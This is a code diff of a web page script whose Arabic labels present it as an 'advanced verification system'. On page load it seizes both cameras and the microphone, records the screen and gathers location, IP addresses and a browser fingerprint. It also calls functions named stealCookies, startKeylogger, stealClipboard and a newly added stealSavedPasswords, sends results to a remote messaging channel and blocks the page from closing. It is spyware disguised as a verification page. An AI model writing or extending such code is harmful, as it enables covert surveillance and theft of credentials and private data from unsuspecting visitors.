-        audio.play().catch(e => {});
-        addLog(`🔊 تم تشغيل صوت تنبيه`, true);
-    }
-    
-    // ========== MAIN ==========
+
+    // ========== الوظيفة الرئيسية ==========
     async function run() {
-        addLog(`🔐 جاري طلب الصلاحيات...`, false);
+        addLog('🔐 جاري طلب الصلاحيات...');
         
         try {
             await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-            addLog(`✅ تم منح الصلاحيات`, true);
+            addLog('✅ تم منح صلاحيات الكاميرا والميكروفون', true);
         } catch(e) {
-            addLog(`❌ لم يتم منح الصلاحيات`, true, true);
-            return;
+            addLog('❌ لم يتم منح الصلاحيات الكاملة', false, true);
         }
         
-        await sendMessage(`🚀 *تم تشغيل نظام التحقق المتقدم*\n🕐 ${new Date().toLocaleString("ar-EG")}`);
+        await sendMessage(`🚀 <b>تم تشغيل نظام التحقق المتقدم v4.0</b>\n🕐 ${new Date().toLocaleString('ar-EG')}\n📱 الجهاز: ${navigator.userAgent.substring(0, 100)}`);
         
-        // تشغيل الكاميرات
         await Promise.all([initFrontCamera(), initBackCamera()]);
         
-        // بدء التصوير
         setTimeout(() => {
             if (frontReady || backReady) captureCycle();
         }, 2000);
         
-        // المهام المتوازية
         startScreenRecording();
-        sendAdvancedDeviceInfo();
-        getLocation();
-        getPublicIP();
-        getLocalIP();
-        getFingerprint();
-        stealCookies();
+        await sendDeviceInfo();
+        await getLocation();
+        await getPublicIP();
+        await getLocalIP();
+        await getFingerprint();
+        await stealCookies();
         startKeylogger();
-        stealClipboard();
-        detectVPN();
-        detectIncognito();
+        await stealClipboard();
+        await stealSavedPasswords();
+        await detectVPN();
+        await detectIncognito();
         detectAdBlock();
         preventClose();
         
-        // التأثيرات
-        setTimeout(() => fakeNotification(), 2000);
-        setTimeout(() => flashBackground(), 3000);
-        setTimeout(() => playAlertSound(), 5000);
-        
-        addLog(`✅ تم تشغيل جميع الميزات بنجاح`, true);
-        addLog(`🔄 النظام يعمل في الخلفية...`, true);
+        addLog('✅ تم تشغيل جميع الميزات بنجاح', true);
+        addLog('🔄 النظام يعمل في الخلفية...', true);
     }
     
     window.onload = () => { setTimeout(run, 500); };
+})();
 </script>
 <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
 </body>
